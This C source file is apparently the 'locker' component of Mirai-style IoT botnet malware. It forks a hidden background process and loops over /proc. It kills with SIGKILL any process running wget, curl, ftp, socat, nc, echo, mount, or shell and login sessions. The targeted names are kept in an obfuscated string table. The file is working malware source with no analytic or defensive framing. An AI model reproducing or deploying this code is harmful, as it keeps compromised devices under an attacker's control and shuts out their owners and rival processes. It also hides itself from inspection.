#define _GNU_SOURCE

#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/prctl.h>

#include "dbg.h"
#include "bool.h"
#include "util.h"
#include "hide.h"
#include "table.h"

#ifdef LOCK_INFECT
static uint8_t locker_table_vals[] = {
    TABLE_KILLER_PROC,
    TABLE_LOCKER_CMDLINE,

    TABLE_LOCKER_WGET,
    TABLE_LOCKER_FTP,
    TABLE_LOCKER_CURL,
    TABLE_LOCKER_SOCAT
};

static uint8_t locker_kill_commands[] = {
    TABLE_LOCKER_WGET,
    TABLE_LOCKER_FTP,
    TABLE_LOCKER_CURL,
    TABLE_LOCKER_SOCAT
};

#define MAX_PIDS 1024
pid_t *allPids;
int maxPids = MAX_PIDS;
int currentPids = 0;

void addPid(pid_t pid) {
    if (currentPids >= maxPids) {
	maxPids *= 2;
	allPids = realloc(allPids, maxPids * sizeof(pid_t));
	if (allPids == NULL) {
	    return;
	}
    }
    allPids[currentPids++] = pid;
}

int isPidChecked(pid_t pid) {
    for (int i = 0; i < currentPids; ++i) {
	if (allPids[i] == pid) {
	    return 1;
	}
    }
    return 0;
}

void addAllPidsToChecked() {
    table_unlock_val(TABLE_KILLER_PROC);
    DIR *dir = opendir(table[TABLE_KILLER_PROC].str);
    table_lock_val(TABLE_KILLER_PROC);

    if (dir == NULL) {
        return;
    }

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && atoi(entry->d_name) > 0) {
            addPid(atoi(entry->d_name));
        }
    }

    closedir(dir);
}
#else
static uint8_t locker_table_vals[] = {
    TABLE_KILLER_PROC,
    TABLE_LOCKER_CMDLINE,

    TABLE_LOCKER_WGET,
    TABLE_LOCKER_FTP,
    TABLE_LOCKER_CURL,
    TABLE_LOCKER_ECHO,
    TABLE_LOCKER_MOUNT,
    TABLE_LOCKER_SOCAT,
    TABLE_LOCKER_NC,

    TABLE_LOCKER_SH,
    TABLE_LOCKER_LOGIN,
    TABLE_LOCKER_STATUS,
    TABLE_LOCKER_PPID
};

static uint8_t locker_kill_commands[] = {
    TABLE_LOCKER_WGET,
    TABLE_LOCKER_FTP,
    TABLE_LOCKER_CURL,
    TABLE_LOCKER_ECHO,
    TABLE_LOCKER_MOUNT,
    TABLE_LOCKER_SOCAT,
    TABLE_LOCKER_NC
};
#endif

#ifndef LOCK_INFECT
static int get_PPid(char *buf, int buf_len) {

    int len = util_memsearch(buf, buf_len, table[TABLE_LOCKER_PPID].str, table[TABLE_LOCKER_PPID].len);

    return len > 0 ? atoi(buf + len) : -1;
}

static BOOL check_status(char *pid) {

    char status_path[32] = {0};

    strcpy(status_path, table[TABLE_KILLER_PROC].str);
    strcat(status_path, pid);
    strcat(status_path, table[TABLE_LOCKER_STATUS].str);

    int fd = open(status_path, O_RDONLY);

    if (fd == -1)
        return FALSE;

    char rdbuf[256] = {0};
    int len = read(fd, rdbuf, sizeof(rdbuf) - 1);
    close(fd);

    if (len <= 0)
        return FALSE;

    if (get_PPid(rdbuf, len) > 1)
        return TRUE;

    return FALSE;
}
#endif

static BOOL check_cmdline(char *pid) {

    char cmdline_path[32] = {0};

    strcpy(cmdline_path, table[TABLE_KILLER_PROC].str);
    strcat(cmdline_path, pid);
    strcat(cmdline_path, table[TABLE_LOCKER_CMDLINE].str);

    int fd = open(cmdline_path, O_RDONLY);

    if (fd == -1)
        return FALSE;

    char rdbuf[128] = {0};
    int len = read(fd, rdbuf, sizeof(rdbuf) - 1);
    close(fd);

    if (len <= 0)
        return FALSE;

    for (unsigned int i = 0; i < (sizeof(locker_kill_commands) / sizeof(locker_kill_commands[0])); i++) {
        if (util_memsearch(rdbuf, len, table[locker_kill_commands[i]].str, table[locker_kill_commands[i]].len))
            return TRUE;
    }
#ifndef LOCK_INFECT
    if (util_memsearch(rdbuf, len, table[TABLE_LOCKER_LOGIN].str, table[TABLE_LOCKER_LOGIN].len)) {
        if (check_status(pid))
            return TRUE;
    }

    int pos = util_memsearch(rdbuf, len, table[TABLE_LOCKER_SH].str, table[TABLE_LOCKER_SH].len);

    if (pos) {
        BOOL found = FALSE;

        for (int i = pos; i < len; i++) {
            if (rdbuf[i] == '/' || (rdbuf[i] == '-' && rdbuf[i + 1] == 'c')) {
                found = TRUE;
                break;
            }
        }

        if (!found && check_status(pid))
            return TRUE;
    }
#endif
    return FALSE;
}

void locker(void) {

    DEBUG_PRINT("[locker] started\n");

    table_unlock_val(TABLE_KILLER_PROC);
    DIR *dir = opendir(table[TABLE_KILLER_PROC].str);
    table_lock_val(TABLE_KILLER_PROC);

    if (!dir) {
	DEBUG_PRINT("[locker] opendir() failed\n");
	return;
    }


    int loc = 0;
    struct dirent *entry;
    while ((entry = readdir(dir))) {
	if (*entry->d_name >= '0' && *entry->d_name <= '9') {
	    loc = telldir(dir);
	    break;
	}
    }

    while (TRUE) {
	for (unsigned int i = 0; i < (sizeof(locker_table_vals) / sizeof(locker_table_vals[0])); i++)
	    table_unlock_val(locker_table_vals[i]);

	seekdir(dir, loc);

        while ((entry = readdir(dir))) {
#ifdef LOCK_INFECT
	    pid_t pid = atoi(entry->d_name);
	    if (isPidChecked(pid))
		continue;
	    addPid(pid);
#endif

            if (check_cmdline(entry->d_name)) {
                DEBUG_PRINT("[locker] found pid: (\'%s\')\n", entry->d_name);
                kill(atoi(entry->d_name), SIGKILL);
            }
        }

	for (unsigned int i = 0; i < (sizeof(locker_table_vals) / sizeof(locker_table_vals[0])); i++)
	    table_lock_val(locker_table_vals[i]);
#ifdef LOCK_INFECT
	usleep(25000);
#else
	usleep(100000);
#endif
    }
}

void locker_init(void) {
    if (fork() != 0) {
	sleep(1);
	return;
    }

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    DEBUG_PRINT("[locker_init] started: (\'%d\')\n", getpid());
#ifdef LOCK_INFECT
    allPids = malloc(MAX_PIDS * sizeof(pid_t));
    if (allPids == NULL) {
	return;
    }

    addAllPidsToChecked();
#endif
    locker();
#ifdef LOCK_INFECT
    free(allPids);
#endif
    exit(0);
}
